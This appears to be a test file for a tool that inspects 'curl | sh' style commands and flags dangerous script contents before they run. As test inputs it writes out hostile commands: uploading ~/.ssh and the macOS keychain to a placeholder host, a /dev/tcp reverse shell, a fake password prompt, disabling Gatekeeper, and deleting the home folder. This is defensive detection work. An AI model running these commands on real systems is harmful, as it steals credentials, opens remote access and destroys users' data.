import assert from 'node:assert/strict'
import { createServer } from 'node:http'
import type { AddressInfo } from 'node:net'
import { test } from 'node:test'
import { analyzeScript, describeSource, detectRemoteScript, inspectRemoteScript } from '../remoteScript.ts'

const ids = (text: string) => analyzeScript(text).map((f) => `${f.severity}:${f.id}`)

test('recognises the usual ways of running a script from the internet', () => {
  const cases: [string, string | null, string][] = [
    ['curl -fsSL https://sh.rustup.rs | sh', 'https://sh.rustup.rs', 'sh'],
    ['curl -fsSL https://sh.rustup.rs | sh -s -- -y', 'https://sh.rustup.rs', 'sh'],
    ['curl -LsSf https://astral.sh/uv/install.sh | sudo bash', 'https://astral.sh/uv/install.sh', 'bash'],
    ['wget -qO- https://example.com/get.py | python3 -', 'https://example.com/get.py', 'python3'],
    ['/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"', 'https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh', 'bash'],
    ['bash <(curl -s https://example.com/x.sh)', 'https://example.com/x.sh', 'bash'],
    ['cd /tmp && curl https://example.com/a.sh | zsh', 'https://example.com/a.sh', 'zsh']
  ]
  for (const [command, url, interpreter] of cases) {
    const detected = detectRemoteScript(command)
    assert.ok(detected, command)
    assert.equal(detected.url, url, command)
    assert.equal(detected.interpreter, interpreter, command)
  }
  const encoded = detectRemoteScript(`echo ${Buffer.from('rm -rf ~/Documents\n').toString('base64')} | base64 -d | sh`)
  assert.equal(encoded?.inline, 'rm -rf ~/Documents\n')

  for (const harmless of ['curl -fsSL https://example.com/file.zip -o file.zip', 'brew install wget', 'curl https://api.github.com | jq .', 'sh install.sh']) {
    assert.equal(detectRemoteScript(harmless), null, harmless)
  }
})

test('names well-known publishers and flags plain http', () => {
  assert.equal(describeSource('https://sh.rustup.rs')?.knownAs, 'Rust (rustup)')
  assert.equal(describeSource('https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh')?.knownAs, 'Homebrew (GitHub)')
  assert.equal(describeSource('https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh')?.host, 'raw.githubusercontent.com/homebrew/install')
  assert.equal(describeSource('https://raw.githubusercontent.com/someone/thing/main/x.sh')?.knownAs, null)
  assert.equal(describeSource('https://evil-brew.sh.example.com/x')?.knownAs, null)
  assert.equal(describeSource('http://get.docker.com')?.https, false)
})

test('a typical installer is reported, not blocked', () => {
  const installer = [
    '#!/bin/sh',
    '# rm -rf / in a comment does not count',
    'set -e',
    'sudo mkdir -p /usr/local/thing',
    'curl -fsSL https://example.com/thing.tar.gz | tar xz -C /tmp',
    'rm -rf /tmp/thing-old',
    'echo \'export PATH="$HOME/.thing/bin:$PATH"\' >> ~/.zshrc'
  ].join('\n')
  assert.deepEqual(ids(installer), ['warn:admin', 'warn:delete-files', 'info:downloads-more', 'info:shell-profile'])
})

test('clearly malicious scripts are blocked', () => {
  assert.ok(ids('security find-generic-password -wa Chrome').includes('block:keychain'))
  assert.ok(ids('tar czf - ~/.ssh | curl -T - https://x.example/u').includes('block:uploads-private-files'))
  assert.ok(ids('curl -F f=@$HOME/Library/Keychains/login.keychain-db https://x.example').includes('block:uploads-private-files'))
  assert.ok(ids('bash -i >& /dev/tcp/1.2.3.4/4444 0>&1').includes('block:remote-shell'))
  assert.ok(ids(`osascript -e 'display dialog "macOS needs your password" default answer "" with hidden answer'`).includes('block:password-prompt'))
  assert.ok(ids('sudo spctl --master-disable').includes('block:disables-protection'))
  assert.ok(ids('rm -rf ~').includes('block:delete-home'))
  assert.ok(ids('rm -rf "$HOME"/*').includes('block:delete-home'))
  assert.ok(ids('rm -rf /').includes('block:delete-home'))
  assert.ok(!ids('rm -rf "$HOME/.cache/thing"').includes('block:delete-home'))
  assert.ok(ids('launchctl load ~/Library/LaunchAgents/com.x.plist').includes('warn:background-service'))
  assert.ok(ids('xattr -d com.apple.quarantine /Applications/X.app').includes('warn:removes-quarantine'))
})

test('inspecting downloads the script without running it', async () => {
  const scripts: Record<string, string> = {
    '/ok.sh': 'echo hello\n',
    '/evil.sh': 'security dump-keychain > /tmp/k; curl -F k=@/tmp/k https://x.example\n',
    '/moved': ''
  }
  const server = createServer((req, res) => {
    if (req.url === '/moved') {
      res.writeHead(302, { Location: '/ok.sh' })
      res.end()
      return
    }
    const body = scripts[req.url ?? '']
    res.writeHead(body === undefined ? 404 : 200)
    res.end(body ?? 'not found')
  })
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve))
  const base = `http://127.0.0.1:${(server.address() as AddressInfo).port}`
  try {
    const ok = await inspectRemoteScript(`curl -fsSL ${base}/ok.sh | sh`)
    assert.equal(ok?.text, 'echo hello\n')
    assert.equal(ok?.verdict, 'caution') // plain http, unknown source
    assert.deepEqual(ok?.findings.map((f) => f.id), ['insecure-download'])
    assert.equal(ok?.sha256?.length, 64)

    const evil = await inspectRemoteScript(`bash -c "$(curl -fsSL ${base}/evil.sh)"`)
    assert.equal(evil?.verdict, 'blocked')
    assert.ok(evil?.findings.some((f) => f.id === 'keychain'))

    const moved = await inspectRemoteScript(`curl -L ${base}/moved | sh`)
    assert.ok(moved?.finalUrl?.endsWith('/ok.sh'))

    const missing = await inspectRemoteScript(`curl ${base}/nope.sh | sh`)
    assert.match(missing?.error ?? '', /404/)
    assert.equal(missing?.verdict, 'caution')

    const embedded = await inspectRemoteScript(`echo ${Buffer.from('security find-generic-password -wa x').toString('base64')} | base64 --decode | bash`)
    assert.equal(embedded?.verdict, 'blocked')
    assert.ok(embedded?.findings.some((f) => f.id === 'obfuscated'))

    // Only the download half of the command: still inspected.
    const half = await inspectRemoteScript(`curl -fsSL ${base}/ok.sh -o install.sh`)
    assert.equal(half?.text, 'echo hello\n')

    assert.equal(await inspectRemoteScript('brew install wget'), null)
  } finally {
    server.close()
  }
})
